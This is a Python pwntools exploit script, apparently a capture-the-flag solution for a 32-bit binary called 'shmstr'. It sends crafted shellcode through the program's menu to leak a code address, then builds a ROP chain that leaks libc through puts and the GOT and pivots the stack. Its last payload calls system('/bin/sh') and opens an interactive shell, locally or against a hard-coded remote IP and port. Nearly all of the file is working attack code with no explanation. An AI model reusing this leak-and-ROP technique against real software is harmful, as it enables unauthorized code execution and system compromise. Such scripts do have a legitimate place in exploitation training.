#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '151.236.114.211', 17173
binary = './shmstr'
brkpts = '''
b *0x5655683f
'''

elf = ELF("shmstr")
libc = ELF("libc.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "i386"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary)
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")

def add(shell):
    io.sendlineafter("> ","1")
    io.sendafter("{?} Enter shellcode: ",shell)

def view(idx):
    io.sendlineafter("> ","2")
    io.sendlineafter("{?} Enter idx: ",str(idx))

def delete(idx):
    io.sendlineafter("> ","3")
    io.sendlineafter("{?} Enter idx: ",str(idx))

def run(idx,arg):
    io.sendlineafter("> ","4")
    io.sendlineafter("{?} Enter idx: ",str(idx))
    io.sendlineafter("{?} Enter shellcode argument: ",str(arg))

if __name__ == "__main__":
    payload = asm("""
                    push ebx
                    pop eax
                    push eax
                    pop eax
                    push eax
                    pop eax
    """)

    #print(payload)

    add(payload)
    run(0,551)

    io.recvuntil("{!} Shellcode return code = ")
    leak = int(io.recvline().strip())
    log.info("leak @ " + hex(leak))
    code = leak - 0x3f9c
    pop_ebx = code + 0x1022
    puts = code + 0x1190
    got = code + 0x3fbc
    run_shellcode = code + 0x173d
    read = code + 0x00001130

    payload = asm("""
              pop edx
              pop edx
              push ebp
              dec ecx
              dec ecx
              push edx
    """)
    #print(payload)

    delete(0)
    add(payload)

    payload2 = asm("""
              pop edx
              pop edx
              push esp
              dec ecx
              dec ecx
              push edx
    """)
    add(payload2)
    run(0, leak - 9849)
    ret = code + 0x0000100e
    push_esp = code + 0x00001244
    pop_ebp = code + 0x000019d3
    rop = p32(code + 0x4070)
    bss = code + 0x4090 + 0x500
    leave = code + 0x00001291
    rop += flat([
        puts,
        pop_ebp,
        got,
        read,
        pop_ebp-2,
        0,
        bss,
        0x1000,
        pop_ebp,
        bss-0x4,
        leave
    ])
    #gdb.attach(io)
    io.sendline(rop)

    leak2 = u32(io.recv(4))
    leak3 = u32(io.recv(4))
    libc.address = leak3 - libc.symbols['puts']
    system = libc.symbols['system']
    binsh = next(libc.search('/bin/sh'))
    log.info("leak @ " + hex(leak2))
    log.info("leak @ " + hex(leak3))
    payload = flat([
        pop_ebx,
        0,
        system,
        "aaaa",
        binsh
    ])
    io.sendline(payload)
    io.interactive()